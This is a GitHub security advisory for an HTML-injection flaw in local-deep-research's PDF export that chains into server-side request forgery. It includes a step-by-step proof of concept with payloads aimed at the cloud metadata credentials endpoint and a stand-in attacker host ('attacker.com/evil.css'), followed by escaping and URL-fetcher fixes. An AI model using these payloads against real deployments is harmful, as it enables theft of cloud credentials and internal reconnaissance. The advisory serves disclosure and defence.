# [M] local-deep-research is Vulnerable to HTML Injection via Unescaped User Input in PDF Export (`pdf_service.py:_markdown_to_html`)

## Summary
Severity: Medium
Advisory: GHSA-fj2m-qvh9-jq4q
CVE: CVE-2026-43979
CWE: CWE-79, CWE-918
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N (CVSS_V3)
Published: 2026-05-11
Source: https://github.com/advisories/GHSA-fj2m-qvh9-jq4q
Type: github-advisory

## Affected
- PyPI: `local-deep-research` — affected >=0 <1.6.0

## Details
## Summary

`PDFService._markdown_to_html()` constructs an HTML document by interpolating user-controlled values — specifically `title` (sourced from `research.title` or `research.query`) and `metadata` key-value pairs — directly into an f-string without any HTML escaping. An authenticated attacker can craft a research query containing HTML special characters to inject arbitrary HTML tags into the document processed by WeasyPrint during PDF export. This injection can be chained to trigger a Server-Side Request Forgery (SSRF), bypassing the application's existing SSRF defenses in `ssrf_validator.py`.

---

## Details

**Vulnerable code:** `src/local_deep_research/web/services/pdf_service.py`, lines 171–176

```python
# pdf_service.py:171-176
if title:
    html_parts.append(f"<title>{title}</title>")   # ← title is not escaped

if metadata:
    for key, value in metadata.items():
        html_parts.append(f'<meta name="{key}" content="{value}">')  # ← key/value are not escaped
```

**Data flow trace:**

```
User input: research.query
        │
        ▼
research_routes.py:1321
  pdf_title = research.title or research.query
        │
        ▼
research_routes.py:1325-1326
  export_report_to_memory(report_content, format, title=pdf_title)
        │
        ▼
pdf_service.py:107
  PDFService.markdown_to_pdf(markdown_content, title=pdf_title)
        │
        ▼
pdf_service.py:137
  _markdown_to_html(markdown_content, title, metadata)
        │
        ▼
pdf_service.py:172
  f"<title>{title}</title>"   ← injection point, no escaping
        │
        ▼
pdf_service.py:112
  HTML(string=html_content)   ← WeasyPrint renders the injected HTML
```

`research.query` is a string submitted by the user via `POST /api/start_research`, stored as-is in the database, and retrieved without any sanitization. When the user triggers `POST /api/v1/research/<research_id>/export/pdf`, this value is embedded unescaped into the HTML document processed by WeasyPrint.

**Injection point 1: `<title>` tag breakout**

```
Input:    </title><img src="http://169.254.169.254/latest/meta-data/" />
Rendered: <title></title><img src="http://169.254.169.254/latest/meta-data/" /></title>
```

When WeasyPrint encounters the injected `<img>` tag, it issues an HTTP GET request to the value of `src` by default.

**Injection point 2: `<meta>` attribute breakout**

```
Input:    " /><link rel="stylesheet" href="http://attacker.com/evil.css
Rendered: <meta name="..." content="" /><link rel="stylesheet" href="http://attacker.com/evil.css">
```

WeasyPrint will fetch and apply the external stylesheet, which also constitutes SSRF.

---

## Proof of Concept

**Step 1: Log in and submit a research query containing the injection payload**

```http
POST /api/start_research HTTP/1.1
Host: localhost:5000
Content-Type: application/json
Cookie: session=<valid_session>

{
  "query": "</title><img src=\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\" onerror=\"x\"/>",
  "mode": "quick",
  "model_provider": "OLLAMA",
  "model": "llama3"
}
```

The response returns a `research_id`, e.g. `"aaaa-bbbb-cccc-dddd"`.

**Step 2: After the research completes, trigger PDF export**

```http
POST /api/v1/research/aaaa-bbbb-cccc-dddd/export/pdf HTTP/1.1
Host: localhost:5000
Cookie: session=<valid_session>
X-CSRFToken: <csrf_token>
```

**Step 3: Intermediate HTML constructed server-side**

```html
<!DOCTYPE html><html><head>
<meta charset="utf-8">
<title></title><img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/" onerror="x"/></title>
</head><body>
...report content...
</body></html>
```

**Step 4: WeasyPrint issues an outbound HTTP request to the injected URL**

Observed in network monitoring (e.g. `tcpdump`) or the target internal service logs:

```
GET /latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: 169.254.169.254
User-Agent: WeasyPrint/...
```

**Lightweight verification (no SSRF environment required):**

Set the query to:

```
</title><title>INJECTED
```

The resulting HTML will contain two `<title>` tags and the PDF document metadata title will read `INJECTED`, confirming successful injection.

---

## Impact

### 1. Chained SSRF (High Severity)

By injecting `<img src>`, `<link href>`, or `<style>@import url()` tags pointing to internal addresses, WeasyPrint will issue HTTP requests on behalf of the server during PDF generation. This allows access to:

- **Cloud metadata services** (`169.254.169.254`) on AWS, GCP, or Azure — enabling theft of IAM credentials and instance identity documents.
- **Internal network services** (`192.168.x.x`, `10.x.x.x`) — enabling reconnaissance and interaction with internal APIs not exposed to the internet.
- **Localhost administrative interfaces** — if SSRF protections are only applied at the user-input validation layer.

This is an effective bypass of the application's existing SSRF defenses in `ssrf_validator.py`, because WeasyPrint's outbound resource requests are never routed through that validator.

### 2. HTML Document Structure Corruption

Injected tags can prematurely close `<head>` and insert arbitrary content into `<body>`, causing WeasyPrint to render incorrectly or crash, resulting in a Denial of Service (DoS) condition for the export functionality.

### 3. CSS Injection (Medium Severity)

By injecting `<link>` or `<style>` tags that load external stylesheets, an attacker can fully control the visual content of the generated PDF, enabling report content forgery or spoofing.

### 4. Affected Scope

- All PDF export operations are affected.
- The vulnerability is reachable by any authenticated user — no elevated privileges required.
- Because each user operates against their own encrypted database, cross-user exploitation is not possible. However, on any shared or multi-tenant deployment, every authenticated user can independently trigger this vulnerability.
---

## Remediation

Apply `html.escape()` to all user-controlled values before embedding them in the HTML template inside `_markdown_to_html`:

```python
import html

if title:
    html_parts.append(f"<title>{html.escape(title)}</title>")

if metadata:
    for key, value in metadata.items():
        html_parts.append(
            f'<meta name="{html.escape(str(key))}" content="{html.escape(str(value))}">'
        )
```

Additionally, consider configuring WeasyPrint with a custom `url_fetcher` that blocks or restricts outbound HTTP requests to prevent SSRF via injected or legitimately-embedded external resources:

```python
def safe_url_fetcher(url, timeout=10):
    from ssrf_validator import validate_url
    if not validate_url(url):
        raise ValueError(f"Blocked unsafe URL in PDF rendering: {url}")
    return weasyprint.default_url_fetcher(url, timeout=timeout)

html_doc = HTML(string=html_content, url_fetcher=safe_url_fetcher)
```
---

*Report generated against commit `f3540fb3` — local-deep-research, branch `main`.*


---

## Maintainer note (2026-04-24)

Thanks @Firebasky for the detailed report. The complete remediation spans two PRs, both merged to `main`:

**#3082** (merged 2026-03-29, shipped in **v1.5.0+**) — closes the HTML-injection sinks:
- `html.escape()` now wraps the `title` value in `<title>…</title>`
- Same for metadata keys/values in `<meta name="…" content="…">`
- Regression tests added in `tests/web/services/test_pdf_service.py`

**#3613** (merged 2026-04-24, shipped in **v1.6.0**) — implements the `url_fetcher` recommendation from the Remediation section:
- New `_safe_url_fetcher` in `pdf_service.py` delegates to `weasyprint.default_url_fetcher` only after `security.ssrf_validator.validate_url` accepts the URL
- Blocks AWS metadata (169.254.169.254), RFC1918, loopback, and non-http(s) schemes
- Covers the chained SSRF path through any URL reaching the rendered HTML — markdown body, citations, raw-HTML passthrough via Python-Markdown
- Blocked URLs raise `UnsafePDFResourceURLError` (a `ValueError` subclass) so WeasyPrint skips the resource and the render continues
- 8 regression tests, including an end-to-end render with `<img src="http://169.254.169.254/…">` embedded in the body

**Advisory metadata:** CVSS `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N` (5.0 Moderate), CWEs **CWE-79** + **CWE-918**. **Patched in v1.6.0** — upgrade to v1.6.0 or later to receive both fixes.

## References
- https://github.com/LearningCircuit/local-deep-research/security/advisories/GHSA-fj2m-qvh9-jq4q
- https://nvd.nist.gov/vuln/detail/CVE-2026-43979
- https://github.com/LearningCircuit/local-deep-research/pull/3082
- https://github.com/LearningCircuit/local-deep-research/pull/3613
- https://github.com/LearningCircuit/local-deep-research/commit/0148fa265a3da460c07def7441f9ac49ea61fbcb
- https://github.com/LearningCircuit/local-deep-research/commit/15f13d5c79847f1c38c2dc67bd0027c38af9e34b
- https://github.com/LearningCircuit/local-deep-research
